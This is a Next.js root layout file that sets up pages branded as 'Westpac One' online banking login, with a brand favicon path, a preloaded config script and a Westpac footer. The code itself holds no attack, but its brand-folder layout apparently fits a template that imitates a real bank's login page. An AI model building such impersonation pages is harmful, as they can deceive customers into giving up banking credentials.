import type { Metadata } from "next";
import "./globals.css";
import Script from "next/script";

import { WestpacFooter } from "@/components/layout/WestpacFooter";

export const metadata: Metadata = {
  title: "Westpac One® - Online Banking",
  description: "Log in to Westpac One online banking",
  icons: {
    icon: '/brands/westpac/favicon.ico',
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body>
        <Script src="/config.js" strategy="beforeInteractive" />
        <div className="page-wrapper">
          {children}
          <WestpacFooter />
        </div>
      </body>
    </html>
  );
}


